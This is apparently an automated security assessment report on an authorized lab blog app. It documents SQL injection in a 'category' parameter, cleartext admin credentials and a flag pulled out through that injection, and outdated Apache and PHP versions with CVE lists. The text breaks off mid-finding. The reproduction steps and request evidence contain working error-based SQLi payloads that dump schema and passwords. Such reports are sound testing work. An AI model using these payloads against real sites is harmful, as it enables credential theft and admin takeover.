# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. CRITICAL — info-disclosure Unauthenticated extraction of cleartext admin credentials via error-based SQLi → full admin takeover](#finding-1)
    - [2. HIGH — sqli SQL Injection in category filter — MySQL error verbosely disclosed](#finding-2)
    - [3. HIGH — vulnerable-component Outdated Apache httpd 2.4.54 — multiple known CVEs (CVE-2023-25690, CVE-2024-38476/38475, HTTP/2 DoS)](#finding-3)
    - [4. HIGH — vulnerable-component End-of-life PHP 7.4.33 — no security support since 2022-11-28; unpatched CVE-2023-3824 (phar RCE-class) & CVE-2023-3823 (XXE)](#finding-4)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mqy36bco-lr10bm` |
| Target | http://target.local:32822/ |
| Started | 2026-06-28T17:52:14.543Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 4 mapped · 4 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 4 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32822`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

4 finding(s): 1 critical, 3 high

## Findings

<a id="finding-1"></a>

### 1. [CRITICAL] [info-disclosure] Unauthenticated extraction of cleartext admin credentials via error-based SQLi → full admin takeover

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32822/

The `admins` table stores the administrator password in CLEARTEXT (CWE-256/312). The application echoes raw MySQL errors ("Error in query: XPATH syntax error: ..."), so the unauthenticated `category` parameter at `/` supports error-based SQL injection via extractvalue(), leaking arbitrary DB data including the live admin credential.

This is a CROSS-ENDPOINT CHAIN with real, live, in-scope secrets, distinct from the bare SQLi finding (sqli::/::category): even with the injection fixed, the password being stored unhashed means any read primitive immediately yields a working admin login.

Extracted secret: username `admin`, password `ONEverySecurePassword_!` (unhashed). Verified live — these exact credentials authenticate at /admin.php, whose success response contains flag{aee858fc-7ed4-4e52-9a7b-dc67ce9c7d33} (POST evidence ev-mqy3qerj-1n / ev-mqy3qfkm-1o), whereas a wrong password is rejected with "Invalid username or password." (ev-mqy3q94v-1m). Schema enumerated via the same injection: tables admins/comments/posts; admins columns id,username,password.

The negative control is a normal `?category=Nature` request (2658 bytes, blog posts, no credential); the two positive replays are the extractvalue leaks (1383 bytes) each returning `~ONEverySecurePassword_!` in the error.

**Reproduction**

```
1. Enumerate schema: GET /?category=Nature' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))-- -  → `~admins,comments,posts`.
2. Enumerate columns: GET /?category=Nature' AND extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name=0x61646d696e73)))-- -  → `~id,username,password`.
3. NEGATIVE CONTROL: GET /?category=Nature (no injection) → 2658 bytes, posts rendered, no credential (ev-mqy3sg1f-1p).
4. POSITIVE x2: GET /?category=Nature' AND extractvalue(1,concat(0x7e,(SELECT substring(password,1,30) FROM admins LIMIT 0,1)))-- -  → 1383 bytes, "Error in query: XPATH syntax error: '~ONEverySecurePassword_!'" (ev-mqy3pyzf-1l, ev-mqy3sh71-1q). Username via SELECT username → `~admin` (ev-mqy3py57-1k).
5. Confirm live: POST /admin.php  username=admin&password=ONEverySecurePassword_! → admin success + flag{aee858fc-7ed4-4e52-9a7b-dc67ce9c7d33}; wrong password → "Invalid username or password.".
Fix: hash passwords (bcrypt/argon2), parameterise the category query, and disable verbose DB error output in production.
```

**Evidence**

- Evidence `ev-mqy3sg1f-1p` — `artifacts/_/ev-mqy3sg1f-1p/`

Request:

```http
GET /?category=Nature HTTP/1.1
Host: target.local:32822
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 2658
content-type: text/html; charset=UTF-8
date: Sun, 28 Jun 2026 18:09:26 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.54 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.4.33


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blog Home</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <h1>Welcome to Our Blog</h1>


    <form action="" method="GET">
        <label for="category">Choose a category:</label>
        <select name="category" id="category" onchange="this.form.submit()">
            <option value="">All Categories</option>        
            <br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Nature' >Nature</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Tech' >Tech</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Cooking' >Cooking</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Photography' >Photography</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Health' >Health</option>        </select>
    </form>

    <div class='post'>
                    <h2>The Magic of Morning Dew</h2>
                    <p>Category: Nature</p>
                    <img src='images/morning-dew.jpg' alt='The Magic of Morning Dew' style='width:200px;height:200px;'/>
                    <p>Experience the serene beauty of morning dew as it glistens on the fresh green leaves, transforming the ordinary garden into a sparkling jewel under the sunrise....</p>
                </div><div class='post'>
                    <h2>Sunset Serenades</h2>
                    <p>Category: Nature</p>
                    <img src='images/sunset.jpg' alt='Sunset Serenades' style='width:200px;height:200px;'/>
                    <p>As the sun sets, the sky turns a palette of deep oranges, fiery reds, and calming purples, offering a perfect backdrop for an evening under the stars....</p>
                </div><div class='post'>
                    <h2>Forest Whisperings</h2>
                    <p>Category: Nature</p>
                    <img src='images/forest.jpg' alt='Forest Whisperings' style='width:200px;height:200px;'/>
                    <p>Walking through the forest, one can hear the whispers of ancient trees, rustling leaves telling tales of old in the crisp, clean air....</p>
                </div></div>
<a href="admin.php">Admin Login</a>
</body>
</html>
```

- Evidence `ev-mqy3pyzf-1l` — `artifacts/_/ev-mqy3pyzf-1l/`

Request:

```http
GET /?category=Nature%27%20AND%20extractvalue(1,concat(0x7e,(SELECT%20substring(password,1,30)%20FROM%20admins%20LIMIT%200,1)))--%20- HTTP/1.1
Host: target.local:32822
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 1383
content-type: text/html; charset=UTF-8
date: Sun, 28 Jun 2026 18:07:31 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.54 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.4.33


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blog Home</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <h1>Welcome to Our Blog</h1>


    <form action="" method="GET">
        <label for="category">Choose a category:</label>
        <select name="category" id="category" onchange="this.form.submit()">
            <option value="">All Categories</option>        
            <br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Nature' >Nature</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Tech' >Tech</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Cooking' >Cooking</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Photography' >Photography</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Health' >Health</option>        </select>
    </form>

    Error in query: XPATH syntax error: '~ONEverySecurePassword_!'
```

- Evidence `ev-mqy3sh71-1q` — `artifacts/_/ev-mqy3sh71-1q/`

Request:

```http
GET /?category=Nature%27%20AND%20extractvalue(1,concat(0x7e,(SELECT%20substring(password,1,30)%20FROM%20admins%20LIMIT%200,1)))--%20- HTTP/1.1
Host: target.local:32822
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 1383
content-type: text/html; charset=UTF-8
date: Sun, 28 Jun 2026 18:09:28 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.54 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.4.33


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blog Home</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <h1>Welcome to Our Blog</h1>


    <form action="" method="GET">
        <label for="category">Choose a category:</label>
        <select name="category" id="category" onchange="this.form.submit()">
            <option value="">All Categories</option>        
            <br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Nature' >Nature</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Tech' >Tech</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Cooking' >Cooking</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Photography' >Photography</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Health' >Health</option>        </select>
    </form>

    Error in query: XPATH syntax error: '~ONEverySecurePassword_!'
```

<a id="finding-2"></a>

### 2. [HIGH] [sqli] SQL Injection in category filter — MySQL error verbosely disclosed

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32822/

The `category` GET parameter is concatenated directly into a MySQL query without parameterisation. Injecting a single quote (`Nature'`) causes the server to display a verbatim MySQL error: "Error in query: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''Nature''' at line 1". A boolean payload (`Nature' OR '1'='1'--`) also triggers a syntax error, confirming unsanitised interpolation. The full database query structure and MySQL version information are leaked in the response. PHP debug notices additionally expose the server filesystem path `/var/www/html/index.php` on every page load.

**Reproduction**

```
1. Navigate to http://target.local:32822/?category=Nature%27 (single quote after a valid category value).
2. Observe the response body contains: "Error in query: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''Nature''' at line 1"
3. Confirm: sending a clean value `?category=Nature` returns posts with no SQL error (negative control).
4. Further confirm with boolean payload: ?category=Nature%27+OR+%271%27%3D%271%27-- also returns a SQL syntax error.
```

**Evidence**

- Evidence `ev-mqy396bg-7` — `artifacts/s-0001/ev-mqy396bg-7/`

Request:

```http
GET /?category=Nature HTTP/1.1
Host: target.local:32822
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 2658
content-type: text/html; charset=UTF-8
date: Sun, 28 Jun 2026 17:54:27 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.54 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.4.33


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blog Home</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <h1>Welcome to Our Blog</h1>


    <form action="" method="GET">
        <label for="category">Choose a category:</label>
        <select name="category" id="category" onchange="this.form.submit()">
            <option value="">All Categories</option>        
            <br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Nature' >Nature</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Tech' >Tech</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Cooking' >Cooking</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Photography' >Photography</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Health' >Health</option>        </select>
    </form>

    <div class='post'>
                    <h2>The Magic of Morning Dew</h2>
                    <p>Category: Nature</p>
                    <img src='images/morning-dew.jpg' alt='The Magic of Morning Dew' style='width:200px;height:200px;'/>
                    <p>Experience the serene beauty of morning dew as it glistens on the fresh green leaves, transforming the ordinary garden into a sparkling jewel under the sunrise....</p>
                </div><div class='post'>
                    <h2>Sunset Serenades</h2>
                    <p>Category: Nature</p>
                    <img src='images/sunset.jpg' alt='Sunset Serenades' style='width:200px;height:200px;'/>
                    <p>As the sun sets, the sky turns a palette of deep oranges, fiery reds, and calming purples, offering a perfect backdrop for an evening under the stars....</p>
                </div><div class='post'>
                    <h2>Forest Whisperings</h2>
                    <p>Category: Nature</p>
                    <img src='images/forest.jpg' alt='Forest Whisperings' style='width:200px;height:200px;'/>
                    <p>Walking through the forest, one can hear the whispers of ancient trees, rustling leaves telling tales of old in the crisp, clean air....</p>
                </div></div>
<a href="admin.php">Admin Login</a>
</body>
</html>
```

- Evidence `ev-mqy38x6b-5` — `artifacts/s-0001/ev-mqy38x6b-5/`

Request:

```http
GET /?category=Nature%27 HTTP/1.1
Host: target.local:32822
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 1492
content-type: text/html; charset=UTF-8
date: Sun, 28 Jun 2026 17:54:15 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.54 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.4.33


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blog Home</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <h1>Welcome to Our Blog</h1>


    <form action="" method="GET">
        <label for="category">Choose a category:</label>
        <select name="category" id="category" onchange="this.form.submit()">
            <option value="">All Categories</option>        
            <br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Nature' >Nature</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Tech' >Tech</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Cooking' >Cooking</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Photography' >Photography</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Health' >Health</option>        </select>
    </form>

    Error in query: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''Nature''' at line 1
```

- Evidence `ev-mqy38xvr-6` — `artifacts/s-0001/ev-mqy38xvr-6/`

Request:

```http
GET /?category=Nature%27+OR+%271%27%3D%271%27-- HTTP/1.1
Host: target.local:32822
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 1484
content-type: text/html; charset=UTF-8
date: Sun, 28 Jun 2026 17:54:16 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.54 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.4.33


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blog Home</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <h1>Welcome to Our Blog</h1>


    <form action="" method="GET">
        <label for="category">Choose a category:</label>
        <select name="category" id="category" onchange="this.form.submit()">
            <option value="">All Categories</option>        
            <br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Nature' >Nature</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Tech' >Tech</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Cooking' >Cooking</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Photography' >Photography</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Health' >Health</option>        </select>
    </form>

    Error in query: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
```

<a id="finding-3"></a>

### 3. [HIGH] [vulnerable-component] Outdated Apache httpd 2.4.54 — multiple known CVEs (CVE-2023-25690, CVE-2024-38476/38475, HTTP/2 DoS)

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32822/

VERSION-BASED finding (matched by the Server banner, not exploited). The server self-reports `Server: Apache/2.4.54 (Debian)` on every response, and the static 404 ServerSignature footer independently confirms `Apache/2.4.54 (Debian)`. 2.4.54 was released June 2022; the current 2.4.x stable is 2.4.62+, so this build is missing ~8 patch releases of security fixes. Known CVEs fixed in later 2.4.x that therefore affect 2.4.54: CVE-2023-25690 (mod_proxy HTTP request smuggling with certain RewriteRule/ProxyPassMatch configs, CVSS 9.8, fixed 2.4.56); CVE-2024-38476 (mod_proxy backend response-header handling → SSRF / local handler execution / info disclosure, CVSS 9.8, fixed 2.4.60); CVE-2024-38475 (mod_rewrite improper escaping → unauthorized filesystem access / source disclosure / possible code execution, CVSS 9.1, fixed 2.4.60); CVE-2024-39573 (mod_rewrite SSRF, fixed 2.4.60); plus HTTP/2 denial-of-service issues CVE-2023-45802, CVE-2023-43622 (fixed 2.4.58) and CVE-2024-27316 (CONTINUATION-flood memory exhaustion, fixed 2.4.59). The CVSS 9.x criticals are config-dependent (they require mod_proxy / mod_rewrite proxying to be configured) and were not actively exploited here; severity set to High on that basis. Operator should confirm the loaded modules/config before relying on the criticals, and upgrade Apache to the current 2.4.x regardless.

**Reproduction**

```
curl -sI http://target.local:32822/ → response header `Server: Apache/2.4.54 (Debian)`. Also visible in the 404 error-page footer: `Apache/2.4.54 (Debian) Server at target.local Port 32822`. Cross-reference 2.4.54 against the Apache httpd security advisories (httpd.apache.org/security/vulnerabilities_24.html) for the CVEs listed above.
```

**Evidence**

- Evidence `ev-mqy3w489-1t` — `artifacts/_/ev-mqy3w489-1t/`

Request:

```http
GET /verdict-nonexistent-aaa111 HTTP/1.1
Host: target.local:32822
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
connection: Keep-Alive
content-length: 279
content-type: text/html; charset=iso-8859-1
date: Sun, 28 Jun 2026 18:12:18 GMT
keep-alive: timeout=5, max=98
server: Apache/2.4.54 (Debian)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.54 (Debian) Server at target.local Port 32822</address>
</body></html>
```

- Evidence `ev-mqy3w250-1r` — `artifacts/_/ev-mqy3w250-1r/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32822
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 5517
content-type: text/html; charset=UTF-8
date: Sun, 28 Jun 2026 18:12:15 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.54 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.4.33


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blog Home</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <h1>Welcome to Our Blog</h1>


    <form action="" method="GET">
        <label for="category">Choose a category:</label>
        <select name="category" id="category" onchange="this.form.submit()">
            <option value="">All Categories</option>        
            <br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Nature' >Nature</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Tech' >Tech</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Cooking' >Cooking</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Photography' >Photography</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Health' >Health</option>        </select>
    </form>

    <div class='post'>
                    <h2>The Magic of Morning Dew</h2>
                    <p>Category: Nature</p>
                    <img src='images/morning-dew.jpg' alt='The Magic of Morning Dew' style='width:200px;height:200px;'/>
                    <p>Experience the serene beauty of morning dew as it glistens on the fresh green leaves, transforming the ordinary garden into a sparkling jewel under the sunrise....</p>
                </div><div class='post'>
                    <h2>Sunset Serenades</h2>
                    <p>Category: Nature</p>
                    <img src='images/sunset.jpg' alt='Sunset Serenades' style='width:200px;height:200px;'/>
                    <p>As the sun sets, the sky turns a palette of deep oranges, fiery reds, and calming purples, offering a perfect backdrop for an evening under the stars....</p>
                </div><div class='post'>
                    <h2>Forest Whisperings</h2>
                    <p>Category: Nature</p>
                    <img src='images/forest.jpg' alt='Forest Whisperings' style='width:200px;height:200px;'/>
                    <p>Walking through the forest, one can hear the whispers of ancient trees, rustling leaves telling tales of old in the crisp, clean air....</p>
                </div><div class='post'>
                    <h2>Decoding Tech Trends</h2>
                    <p>Category: Tech</p>
                    <img src='images/tech-trends.jpg' alt='Decoding Tech Trends' style='width:200px;height:200px;'/>
                    <p>An analysis of emerging technology trends that will shape our future, from AI advancements to the rise of quantum computing....</p>
                </div><div class='post'>
                    <h2>The Future of Robotics</h2>
                    <p>Category: Tech</p>
                    <img src='images/robotics.jpg' alt='The Future of Robotics' style='width:200px;height:200px;'/>
                    <p>Exploring the potential impacts of robotics in various industries, and how they are set to revolutionize efficiency and productivity....</p>
                </div><div class='post'>
                    <h2>Mediterranean Diet Secrets</h2>
                    <p>Category: Cooking</p>
                    <img src='images/mediterranean-diet.jpg' alt='Mediterranean Diet Secrets' style='width:200px;height:200px;'/>
                    <p>Unlock the longevity secrets of the Mediterranean diet and discover recipes that combine both taste and health....</p>
                </div><div class='post'>
                    <h2>The Art of French Baking</h2>
                    <p>Category: Cooking</p>
                    <img src='images/french-baking.jpg' alt='The Art of French Baking' style='width:200px;height:200px;'/>
                    <p>Master the art of French baking with these simple steps for making the perfect croissant....</p>
                </div><div class='post'>
                    <h2>Beyond the Camera Lens</h2>
                    <p>Category: Photography</p>
                    <img src='images/camera-lens.jpg' alt='Beyond the Camera Lens' style='width:200px;height:200px;'/>
                    <p>Exploring the art of photography through a lens of expression and creativity, where every picture tells a story....</p>
                </div><div class='post'>
                    <h2>Urban Photography Tips</h2>
                    <p>Category: Photography</p>
                    <img src='images/urban-photography.jpg' alt='Urban Photography Tips' style='width:200px;height:200px;'/>
                    <p>Capture the essence of urban life with these practical tips on urban photography, from choosing the right gear to finding the perfect angle....</p>
                </div><div class='post'>
                    <h2>The Healing Power of Yoga</h2>
                    <p>Category: Health</p>
                    <img src='images/yoga.jpg' alt='The Healing Power of Yoga' style='width:200px;height:200px;'/>
                    <p>Discover the transformative power of yoga on your body and mind, featuring success stories and tips for beginners....</p>
                </div></div>
<a href="admin.php">Admin Login</a>
</body>
</html>
```

- Evidence `ev-mqy3w39k-1s` — `artifacts/_/ev-mqy3w39k-1s/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32822
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 5517
content-type: text/html; charset=UTF-8
date: Sun, 28 Jun 2026 18:12:16 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.54 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.4.33


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blog Home</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <h1>Welcome to Our Blog</h1>


    <form action="" method="GET">
        <label for="category">Choose a category:</label>
        <select name="category" id="category" onchange="this.form.submit()">
            <option value="">All Categories</option>        
            <br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Nature' >Nature</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Tech' >Tech</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Cooking' >Cooking</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Photography' >Photography</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Health' >Health</option>        </select>
    </form>

    <div class='post'>
                    <h2>The Magic of Morning Dew</h2>
                    <p>Category: Nature</p>
                    <img src='images/morning-dew.jpg' alt='The Magic of Morning Dew' style='width:200px;height:200px;'/>
                    <p>Experience the serene beauty of morning dew as it glistens on the fresh green leaves, transforming the ordinary garden into a sparkling jewel under the sunrise....</p>
                </div><div class='post'>
                    <h2>Sunset Serenades</h2>
                    <p>Category: Nature</p>
                    <img src='images/sunset.jpg' alt='Sunset Serenades' style='width:200px;height:200px;'/>
                    <p>As the sun sets, the sky turns a palette of deep oranges, fiery reds, and calming purples, offering a perfect backdrop for an evening under the stars....</p>
                </div><div class='post'>
                    <h2>Forest Whisperings</h2>
                    <p>Category: Nature</p>
                    <img src='images/forest.jpg' alt='Forest Whisperings' style='width:200px;height:200px;'/>
                    <p>Walking through the forest, one can hear the whispers of ancient trees, rustling leaves telling tales of old in the crisp, clean air....</p>
                </div><div class='post'>
                    <h2>Decoding Tech Trends</h2>
                    <p>Category: Tech</p>
                    <img src='images/tech-trends.jpg' alt='Decoding Tech Trends' style='width:200px;height:200px;'/>
                    <p>An analysis of emerging technology trends that will shape our future, from AI advancements to the rise of quantum computing....</p>
                </div><div class='post'>
                    <h2>The Future of Robotics</h2>
                    <p>Category: Tech</p>
                    <img src='images/robotics.jpg' alt='The Future of Robotics' style='width:200px;height:200px;'/>
                    <p>Exploring the potential impacts of robotics in various industries, and how they are set to revolutionize efficiency and productivity....</p>
                </div><div class='post'>
                    <h2>Mediterranean Diet Secrets</h2>
                    <p>Category: Cooking</p>
                    <img src='images/mediterranean-diet.jpg' alt='Mediterranean Diet Secrets' style='width:200px;height:200px;'/>
                    <p>Unlock the longevity secrets of the Mediterranean diet and discover recipes that combine both taste and health....</p>
                </div><div class='post'>
                    <h2>The Art of French Baking</h2>
                    <p>Category: Cooking</p>
                    <img src='images/french-baking.jpg' alt='The Art of French Baking' style='width:200px;height:200px;'/>
                    <p>Master the art of French baking with these simple steps for making the perfect croissant....</p>
                </div><div class='post'>
                    <h2>Beyond the Camera Lens</h2>
                    <p>Category: Photography</p>
                    <img src='images/camera-lens.jpg' alt='Beyond the Camera Lens' style='width:200px;height:200px;'/>
                    <p>Exploring the art of photography through a lens of expression and creativity, where every picture tells a story....</p>
                </div><div class='post'>
                    <h2>Urban Photography Tips</h2>
                    <p>Category: Photography</p>
                    <img src='images/urban-photography.jpg' alt='Urban Photography Tips' style='width:200px;height:200px;'/>
                    <p>Capture the essence of urban life with these practical tips on urban photography, from choosing the right gear to finding the perfect angle....</p>
                </div><div class='post'>
                    <h2>The Healing Power of Yoga</h2>
                    <p>Category: Health</p>
                    <img src='images/yoga.jpg' alt='The Healing Power of Yoga' style='width:200px;height:200px;'/>
                    <p>Discover the transformative power of yoga on your body and mind, featuring success stories and tips for beginners....</p>
                </div></div>
<a href="admin.php">Admin Login</a>
</body>
</html>
```

<a id="finding-4"></a>

### 4. [HIGH] [vulnerable-component] End-of-life PHP 7.4.33 — no security support since 2022-11-28; unpatched CVE-2023-3824 (phar RCE-class) & CVE-2023-3823 (XXE)

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32822/

VERSION-BASED finding (matched by the X-Powered-By banner, not exploited). The application exposes `X-Powered-By: PHP/7.4.33` on PHP-processed responses (the 200 root is clearly PHP — it leaks `/var/www/html/index.php` runtime notices). 7.4.33 is the FINAL release of the PHP 7.4 branch, which reached END-OF-LIFE on 2022-11-28. Since then PHP 7.4 receives NO security patches, so every 7.4-affecting CVE disclosed after that date is permanently unfixed on this host. Notable post-EOL, unpatched issues: CVE-2023-3824 (heap buffer overflow when reading a crafted phar directory → memory corruption / potential RCE; fixed only in 8.0.30/8.1.22/8.2.8); CVE-2023-3823 (XML external-entity loading via SOAP/SimpleXML/DOM → file disclosure / SSRF; fixed 8.0.30/8.1.22/8.2.8); CVE-2023-0567 (password_hash/crypt bcrypt accepts NUL-truncated input as valid); CVE-2023-0568 (1-byte heap overflow in path resolution); CVE-2023-0662 (file-upload part-count DoS). Note: CVE-2024-4577 (PHP-CGI argument-injection RCE, CVSS 9.8) primarily affects Windows installs running php-cgi with certain code pages; this is Debian and the X-Powered-By SAPI banner suggests mod_php, so it is likely NOT applicable here — flagged for completeness only. Exploitability of the phar/XML CVEs depends on whether the app reaches those code paths; severity set to High because the runtime is wholly out of security 